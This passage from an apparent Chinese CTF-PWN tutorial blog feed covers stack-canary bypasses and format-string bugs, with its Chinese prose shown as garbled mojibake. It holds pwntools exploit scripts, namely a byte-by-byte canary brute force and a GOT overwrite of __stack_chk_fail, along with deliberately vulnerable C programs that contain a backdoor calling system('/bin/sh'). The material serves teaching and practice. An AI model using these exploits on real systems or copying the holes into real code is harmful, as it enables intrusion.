string">"./one_by_one"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./one_by_one"</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"Find %d"</span> <span class="token operator">%</span> k<span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#print "Check %d for %d" % (b, k)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>b<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Hacker!\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">'stack smashing detected'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">'the %d is %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span> b<span class="token punctuation">)</span>canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>b<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token keyword">break</span> <span class="token keyword">print</span> <span class="token string">'canary: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/canary/6.png"></p><h2 id="åŠ«æŒ-stack-chk-fail-å‡½æ•°"><a href="#åŠ«æŒ-stack-chk-fail-å‡½æ•°" class="headerlink" title="åŠ«æŒ__stack_chk_fail å‡½æ•°"></a>åŠ«æŒ__stack_chk_fail å‡½æ•°</h2><h3 id="åŸç†-4"><a href="#åŸç†-4" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨å¼€å¯canaryä¿æŠ¤çš„ç¨‹åºä¸­ï¼Œå¦‚æœcanaryä¸å¯¹ï¼Œç¨‹åºä¼šè½¬åˆ°**__stack_chk_failå‡½æ•°æ‰§è¡Œ**ã€‚__stack_chk_failå‡½æ•°æ˜¯ä¸€ä¸ªæ™®é€šçš„å»¶è¿Ÿç»‘å®šå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹GOTè¡¨åŠ«æŒè¿™ä¸ªå‡½æ•°ã€‚</p><h3 id="ä¾‹å­-2"><a href="#ä¾‹å­-2" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>æµ‹è¯•ä»£ç ï¼š</p><ul><li>ç¨‹åºå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¸”æœ‰åé—¨å‡½æ•°</li><li>è¿™é‡Œåªæœ‰ä¸€æ¬¡readâ€“printfæœºä¼šï¼Œæ‰€ä»¥ä¸èƒ½leak canaryåå†æ”»å‡»</li><li>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»»æ„åœ°å€å†™ï¼Œå°†__stack_chk_failçš„gotè¡¨é¡¹å†…å®¹æ›¿æ¢ä¸ºgetshellå‡½æ•°åœ°å€</li><li>è§¦å‘Canaryï¼Œæ‰§è¡Œ__stack_chk_fail ==&gt; getshell</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -m32 stack_chk_fail.c -o stack_chk_fail</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./stack_chk_fail"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./stack_chk_fail"</span><span class="token punctuation">)</span><span class="token comment">#æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ç›¸å¯¹äºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ä¸º10</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ•°ç»„ä¸‹æ ‡è¶Šç•Œç»•è¿‡Canary"><a href="#æ•°ç»„ä¸‹æ ‡è¶Šç•Œç»•è¿‡Canary" class="headerlink" title="æ•°ç»„ä¸‹æ ‡è¶Šç•Œç»•è¿‡Canary"></a>æ•°ç»„ä¸‹æ ‡è¶Šç•Œç»•è¿‡Canary</h2><h3 id="åŸç†-5"><a href="#åŸç†-5" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>å½“ç¨‹åºä¸­å­˜åœ¨æ•°ç»„ï¼Œæ²¡æœ‰å¯¹è¾¹ç•Œè¿›è¡Œæ£€æŸ¥æ—¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥å¯¹æ•°ç»„è¿›è¡Œå¯¹åº”ä½ç½®ä¿®æ”¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡canaryæ£€æµ‹ï¼Œç›´æ¥ä¿®æ”¹è¿”å›åœ°å€ã€‚æ‰€ä»¥å¦‚æœå¯ä»¥å¯¹arræ•°ç»„ä»»æ„ä½ç½®è¿›è¡Œä¿®æ”¹ï¼Œè¿™å°±å­˜åœ¨æ•°ç»„ä¸‹æ ‡æº¢å‡ºã€‚</p><p>ä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œæ•°ç»„å¤§å°ä¸º3ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹æ•°ç»„çš„ä¸‹æ ‡è¿›è¡Œæ£€æŸ¥ï¼Œè¿™æ—¶è¿”å›åœ°å€å°±ç›¸å½“äºarr[5]ï¼Œå¦‚æœæˆ‘ä»¬å¯¹arr[5]è¿›è¡Œä¿®æ”¹å°±æ˜¯å¯¹è¿”å›åœ°å€è¿›è¡Œä¿®æ”¹ã€‚</p><p><img src="/2023/04/09/canary/0.png"></p><h2 id="è¦†ç›–-TLS-ä¸­å‚¨å­˜çš„-Canary-å€¼-ï¼ˆå…·ä½“è§Canary-TLS-Blog"><a href="#è¦†ç›–-TLS-ä¸­å‚¨å­˜çš„-Canary-å€¼-ï¼ˆå…·ä½“è§Canary-TLS-Blog" class="headerlink" title="è¦†ç›– TLS ä¸­å‚¨å­˜çš„ Canary å€¼ ï¼ˆå…·ä½“è§Canary-TLS Blog"></a>è¦†ç›– TLS ä¸­å‚¨å­˜çš„ Canary å€¼ ï¼ˆå…·ä½“è§Canary-TLS Blog</h2><h3 id="åŸç†-6"><a href="#åŸç†-6" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><strong>å·²çŸ¥ Canary å‚¨å­˜åœ¨ TLS ä¸­ï¼Œåœ¨å‡½æ•°è¿”å›å‰ä¼šä½¿ç”¨è¿™ä¸ªå€¼è¿›è¡Œå¯¹æ¯”ã€‚å½“æº¢å‡ºå°ºå¯¸è¾ƒå¤§æ—¶ï¼Œå¯ä»¥åŒæ—¶è¦†ç›–æ ˆä¸Šå‚¨å­˜çš„ Canary å’Œ TLS å‚¨å­˜çš„ Canary å®ç°ç»•è¿‡ã€‚ï¼ˆä¸€èˆ¬æ˜¯é’ˆå¯¹å­çº¿ç¨‹</strong></p><p>å¦‚æœæˆ‘ä»¬æº¢å‡ºçš„è¶³å¤Ÿå¤§ï¼Œå¤§åˆ°èƒ½å¤Ÿè¦†ç›–åˆ°fs/gså¯„å­˜å™¨å¯¹åº”åç§»ä½çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹canaryä¸ºæˆ‘ä»¬è®¾è®¡å¥½çš„å€¼ï¼Œè¿™æ ·åœ¨ç¨‹åºæ£€æµ‹æ—¶å°±ä¼šå’Œæˆ‘ä»¬åŒ¹é…çš„å€¼è¿›è¡Œæ£€æµ‹ï¼Œä»è€Œç»•è¿‡canaryä¿æŠ¤ã€‚åœ¨åˆå§‹åŒ–canaryæ—¶ï¼Œ<strong>fså¯„å­˜å™¨æŒ‡å‘çš„ä½ç½®æ˜¯TLSç»“æ„ä½“</strong>ï¼Œè€ŒfsæŒ‡å‘çš„ä½ç½®åŠ ä¸Š0x28åç§»çš„ä½ç½®å–å‡ºæ¥çš„canaryå°±åœ¨TLSç»“æ„ä½“é‡Œé¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canaryç»•è¿‡ä¸åˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²</title>
      <link href="/2023/04/08/ge-shi-hua-zi-fu-chuan/"/>
      <url>/2023/04/08/ge-shi-hua-zi-fu-chuan/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="åŸç†ä»‹ç»"><a href="#åŸç†ä»‹ç»" class="headerlink" title="åŸç†ä»‹ç»"></a>åŸç†ä»‹ç»</h3><h4 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²-å‡½æ•°"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²-å‡½æ•°" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²(å‡½æ•°"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²(å‡½æ•°</h4><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†<strong>ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°</strong>ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²</li><li>åç»­å‚æ•°ï¼Œ<strong>å¯é€‰(å°±æ˜¯ç›¸åº”çš„è¦è¾“å‡ºçš„å˜é‡</strong></li></ul><p><strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong>åŸºæœ¬æ ¼å¼ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span><span class="token punctuation">[</span>parameter<span class="token punctuation">]</span><span class="token punctuation">[</span>flags<span class="token punctuation">]</span><span class="token punctuation">[</span>field width<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">.</span>precision<span class="token punctuation">]</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span>type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>parameter<ul><li><font color="red">n$ï¼Œè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•°</font>(nä¸ºå‚æ•°åˆ—è¡¨ä¸­çš„ç¬¬å‡ ä¸ªå‚æ•°)</li></ul></li><li>field width<ul><li>è¾“å‡ºçš„æœ€å°å®½åº¦</li></ul></li><li>precision<ul><li>è¾“å‡ºçš„æœ€å¤§é•¿åº¦</li></ul></li><li>lengthï¼Œè¾“å‡ºçš„é•¿åº¦<ul><li><font color="red">hhï¼Œè¾“å‡ºä¸€ä¸ªå­—èŠ‚</font></li><li><font color="red">hï¼Œè¾“å‡ºä¸€ä¸ªåŒå­—èŠ‚</font></li></ul></li><li>type<ul><li><font color="red">nï¼Œä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚</font></li><li>%ï¼Œ â€˜<code>%</code>â€˜å­—é¢å€¼ï¼Œä¸æ¥å—ä»»ä½• flags, widthã€‚</li></ul></li></ul><h4 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h4><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥è¿›è¡Œè§£æçš„ã€‚**é‚£ä¹ˆç›¸åº”çš„<font color="red">è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ç”±è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€æ§åˆ¶</font>**ã€‚æ¯”å¦‚è¯´â€™%sâ€™è¡¨æ˜æˆ‘ä»¬ä¼šè¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ã€‚</p><p>egï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">float</span> b <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"hello world!"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %lf, c = %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è°ƒç”¨printfå‰æ ˆä¸­çš„åˆ†å¸ƒ(x86)ï¼š</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/1.png"></p><p>åœ¨è¿›å…¥ printf ä¹‹åï¼Œå‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä¸€ä¸ªè¯»å–å…¶å­—ç¬¦ä¼šé‡åˆ°ä¸¤ç§æƒ…å†µ</p><ul><li>å½“å‰å­—ç¬¦ä¸æ˜¯ %ï¼Œç›´æ¥è¾“å‡ºåˆ°ç›¸åº”æ ‡å‡†è¾“å‡ºã€‚</li><li>å½“å‰å­—ç¬¦æ˜¯ %ï¼Œ ç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦<ul><li>å¦‚æœæ²¡æœ‰å­—ç¬¦ï¼ŒæŠ¥é”™</li><li>å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ %, è¾“å‡º %</li><li>å¦åˆ™æ ¹æ®ç›¸åº”çš„å­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œè§£æå¹¶è¾“å‡º</li></ul></li></ul><p>æˆ‘ä»¬æŠŠä»£ç ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %lf, c = %s\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶æ ˆä¸­çš„åˆ†å¸ƒå¦‚ä¸‹ï¼š</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/2.png"></p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å‘ç°<strong>æˆ‘ä»¬å¹¶æ²¡æœ‰æä¾›å‚æ•°</strong>ï¼Œé‚£ä¹ˆç¨‹åºä¼šå¦‚ä½•è¿è¡Œå‘¢ï¼Ÿç¨‹åºç…§æ ·ä¼šè¿è¡Œï¼Œ<strong>ä¼šå°†æ ˆä¸Šå­˜å‚¨æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ä¸Šé¢çš„ä¸‰ä¸ªå˜é‡åˆ†åˆ«è§£æä¸ºï¼š</strong></p><ol><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æ•´å½¢å€¼</li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æµ®ç‚¹å€¼</li><li>è§£æå…¶åœ°å€å¯¹åº”çš„å­—ç¬¦ä¸²</li></ol><p>å¯¹äº 1ï¼Œ2 æ¥è¯´å€’è¿˜æ— å¦¨ï¼Œä½†æ˜¯å¯¹äº 3 æ¥è¯´ï¼Œå¦‚æœæä¾›äº†ä¸€ä¸ªä¸å¯è®¿é—®åœ°å€ï¼Œæ¯”å¦‚ 0ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šå› æ­¤è€Œå´©æºƒã€‚</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/3.png"></p><p>è¿™é‡Œç»™å¤§å®¶å‡ºä¸ªå°é—®é¢˜ï¼šè¯·é—®ä¸‹é¢è¿™æ®µä»£ç çš„è¾“å‡ºç»“æœæ˜¯ä»€ä¹ˆï¼Ÿï¼Ÿ</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">float</span> b <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"hello world!"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %lf, c = %s, x = %d, %n x = %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> s<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"x = %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/4.png"></p><p>ä¸ºä»€ä¹ˆç¬¬ä¸€ä¸ªprintfè¾“å‡ºçš„xéƒ½æ˜¯200å‘¢ï¼Ÿè€Œä¸‹é¢æ˜¯49å‘¢ï¼Ÿè¯·è‡ªè¡ŒæŸ¥çœ‹åœ¨è°ƒç”¨printfå‡½æ•°ä¹‹å‰çš„æ ˆåˆ†å¸ƒã€‚</p><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨</h3><h4 id="æ³„æ¼å†…å­˜"><a href="#æ³„æ¼å†…å­˜" class="headerlink" title="æ³„æ¼å†…å­˜"></a>æ³„æ¼å†…å­˜</h4><ul><li>æ³„éœ²æ ˆå†…å­˜<ul><li>è·å–æŸä¸ªå˜é‡çš„å€¼</li><li>è·å–æŸä¸ªå˜é‡å¯¹åº”åœ°å€çš„å†…å­˜</li></ul></li><li>æ³„éœ²ä»»æ„åœ°å€å†…å­˜<ul><li>åˆ©ç”¨ GOT è¡¨å¾—åˆ° libc å‡½æ•°åœ°å€ï¼Œè¿›è€Œè·å– libcï¼Œè¿›è€Œè·å–å…¶å®ƒ libc å‡½æ•°åœ°å€</li><li>ç›²æ‰“ï¼Œdump æ•´ä¸ªç¨‹åºï¼Œè·å–æœ‰ç”¨ä¿¡æ¯ã€‚</li></ul></li></ul><h5 id="æ³„æ¼æ ˆå†…å­˜"><a href="#æ³„æ¼æ ˆå†…å­˜" class="headerlink" title="æ³„æ¼æ ˆå†…å­˜"></a>æ³„æ¼æ ˆå†…å­˜</h5><h6 id="è·å–æ ˆå˜é‡çš„å€¼"><a href="#è·å–æ ˆå˜é‡çš„å€¼" class="headerlink" title="è·å–æ ˆå˜é‡çš„å€¼"></a>è·å–æ ˆå˜é‡çš„å€¼</h6><p>è¿™é‡Œç»™å‡ºwikiä¸Šçš„ä¾‹å­ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬è¾“å…¥%p-%p-%p</p><ul><li>ç¨‹åºæ–­åœ¨ç¬¬ä¸€ä¸ªprintfå¤„</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">æ­¤æ—¶æ ˆåˆ†å¸ƒä¸ºï¼šè¿”å›åœ°å€æ ¼å¼åŒ–å­—ç¬¦ä¸² <span class="token operator">=</span> <span class="token string">"%08x.%08x.%08x.%s\n"</span>å‚æ•°<span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0x1</span>å‚æ•°<span class="token number">2</span> <span class="token operator">=</span> <span class="token number">0x22222222</span>å‚æ•°<span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0xffffffff</span>å‚æ•°<span class="token number">4</span> <span class="token operator">=</span> address of <span class="token char">'%p-%p-%p'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/5.png"></p><ul><li>ç¨‹åºæ–­åœ¨ç¬¬äºŒä¸ªprintfå¤„</li></ul><pre class="line-numbers language-none"><code class="language-none">æ­¤æ—¶æ ˆåˆ†å¸ƒï¼šè¿”å›åœ°å€æ ¼å¼åŒ–å­—ç¬¦ä¸² = "%p-%p-%p"0xffffd0080xf7ffd9180xf0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„æˆ‘è¿™é‡Œå¹¶æ²¡æœ‰è¯´æˆå‚æ•°ï¼Œä½†æ˜¯å½“è§£ææ ¼å¼å­—ç¬¦ä¸²æ—¶ï¼Œä¼šæŠŠæ ˆä¸­çš„å€¼æŒ‰ç…§ç±»å‹è¿›è¡Œè§£æå¹¶è¾“å‡ºï¼Œæ‰€ä»¥è¾“å‡ºä¸º<code>0xffffd008-0xf7ffd918-0xf0</code>ã€‚è¿™é‡Œå…¶å®å°±æ³„æ¼äº†æ 